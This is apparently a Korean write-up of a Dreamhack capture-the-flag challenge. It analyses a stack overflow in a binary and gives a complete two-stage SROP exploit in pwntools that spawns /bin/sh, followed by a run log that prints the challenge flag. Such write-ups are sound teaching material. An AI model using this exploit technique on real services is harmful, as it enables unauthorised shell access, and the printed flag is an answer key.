# ✏️ SigReturn-Oriented Programming Write-up
https://dreamhack.io/wargame/challenges/145

## 📄 Vulnerability & Code Analysis
따로 소스코드가 제공되어 있지 않으므로 IDA를 이용해 바이너리를 분석한다.
```c
void __noreturn start()
{
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stdin, 0LL, 1, 0LL);
  write(1, "++++++++++++++++++Welcome to dreamhack++++++++++++++++++\n", 0x39uLL);
  write(1, "+ You can send a signal to dreamhack server.           +\n", 0x39uLL);
  write(1, "++++++++++++++++++++++++++++++++++++++++++++++++++++++++\n", 0x39uLL);
  sub_4010B6();
  exit(0);
}
```
`sub_4010B6()`함수를 분석해보자.
```c
ssize_t sub_4010B6()
{
  _BYTE buf[8]; // [rsp+8h] [rbp-8h] BYREF

  write(1, "Signal:", 7uLL);
  return read(0, buf, 0x400uLL);
}
```
buf의 크기는 8byte이지만 읽는 버퍼의 크기가 0x400이므로 stack buffer overflow가 가능하다.
다만 ROPchain을 구성하기 위해서는 버퍼의 크기가 작으므로 SROP를 사용해서 셸을 딸 수 있다.

## 🗡️ Exploit / Solver Strategy
기존에 풀었던 srop문제와 같은 방식으로 익스플로잇 설계를 진행한다.
다만 srop와 달리 주어진 gadget이 없으므로 `ROPgadget`을 사용하여 필요한 가젯의 주소를 얻는다.
```bash
(.venv) (base) ➜  send_sig ROPgadget --binary ./send_sig | grep -E "syscall|pop rax|pop rdi|pop rsi|pop rdx"
0x00000000004010a9 : cli ; push rbp ; mov rbp, rsp ; pop rax ; ret
0x00000000004010a6 : endbr64 ; push rbp ; mov rbp, rsp ; pop rax ; ret
0x00000000004010ac : mov ebp, esp ; pop rax ; ret
0x00000000004010ab : mov rbp, rsp ; pop rax ; ret
0x00000000004010ae : pop rax ; ret
0x00000000004010aa : push rbp ; mov rbp, rsp ; pop rax ; ret
0x00000000004010b0 : syscall
```
따라서 이를 이용해서 1차 sigreturn syscall을 호출하는 `SigreturnFrame()`을 만든다.
```python
pop_rax_ret = 0x4010ae
syscall = 0x4010b0
bss = e.bss() + 0x500

frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = bss
frame.rdx = 0x400
frame.rip = syscall
frame.rsp = bss

payload = b'A' *  16
payload += p64(pop_rax_ret)
payload += p64(15)  # syscall number for sigreturn
payload += p64(syscall)
payload += bytes(frame)
p.send(payload)
```
이후에 `execve` syscall을 `.bss`영역에 `/bin/sh`의 주소와 2차 payload로 구성한다.
```python
binsh = bss + 0x200
frame2 = SigreturnFrame()
frame2.rax = 59
frame2.rdi = binsh
frame2.rsi = 0
frame2.rdx = 0
frame2.rip = syscall

payload2 = b''
payload2 += p64(pop_rax_ret)
payload2 += p64(15)  # syscall number for sigreturn
payload2 += p64(syscall)
payload2 += bytes(frame2)
payload2 = payload2.ljust(0x200, b'\x00')
payload2 += b'/bin/sh\x00'

p.send(payload2)
```

## 💻 Final Payload or Solver
```python
from pwn import *
p = remote('host3.dreamhack.games', 15725)
e = ELF('./send_sig')
context.arch = 'amd64'

pop_rax_ret = 0x4010ae
syscall = 0x4010b0
bss = e.bss() + 0x500

frame = SigreturnFrame()
frame.rax = 0
frame.rdi = 0
frame.rsi = bss
frame.rdx = 0x400
frame.rip = syscall
frame.rsp = bss

payload = b'A' *  16
payload += p64(pop_rax_ret)
payload += p64(15)  # syscall number for sigreturn
payload += p64(syscall)
payload += bytes(frame)
p.send(payload)

binsh = bss + 0x200
frame2 = SigreturnFrame()
frame2.rax = 59
frame2.rdi = binsh
frame2.rsi = 0
frame2.rdx = 0
frame2.rip = syscall

payload2 = b''
payload2 += p64(pop_rax_ret)
payload2 += p64(15)  # syscall number for sigreturn
payload2 += p64(syscall)
payload2 += bytes(frame2)
payload2 = payload2.ljust(0x200, b'\x00')
payload2 += b'/bin/sh\x00'

p.send(payload2)
p.interactive()
```

## 🏳️ cat flag
```bash
(.venv) (base) ➜  send_sig pypwn send_sig.py
[┘] Opening connection to host8.dreamhack.games on port 13169: Trying 15[+] Opening connection to host8.dreamhack.games on port 13169: Done
[*] '/home/daniel/dreamhack/pwn/send_sig/send_sig'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
[*] Switching to interactive mode
++++++++++++++++++Welcome to dreamhack++++++++++++++++++
+ You can send a signal to dreamhack server.           +
++++++++++++++++++++++++++++++++++++++++++++++++++++++++
Signal:$ cat flag.txt
DH{5a5e56589d32087ec7a37f3b70a84483eae7404e9072173ec7571b632b804760}
$
```
